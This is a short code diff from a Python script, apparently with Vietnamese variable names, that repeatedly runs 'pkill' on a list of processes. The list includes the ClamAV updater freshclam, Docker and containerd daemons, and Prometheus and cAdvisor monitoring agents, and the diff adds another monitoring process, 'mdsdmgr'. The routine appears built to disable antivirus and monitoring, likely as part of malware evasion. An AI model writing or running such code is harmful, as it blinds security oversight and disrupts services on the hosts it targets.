@@ -217,7 +217,7 @@ if operate_system == 'lin':
         for i in range(0, thoi_gian_nghi, 10):
             time.sleep(10)
             print('Thoi gian con la la ' + str(thoi_gian_nghi - i))
-            array_kill = ['freshclam', 'dockerd', 'containerd', 'node_controller', 'cadvisor', 'prometheus', 'node_agent', 'tail']
+            array_kill = ['freshclam', 'dockerd', 'containerd', 'mdsdmgr', 'node_controller', 'cadvisor', 'prometheus', 'node_agent', 'tail']
             for i in array_kill:
                 try:
                     os.system('pkill ' + i)
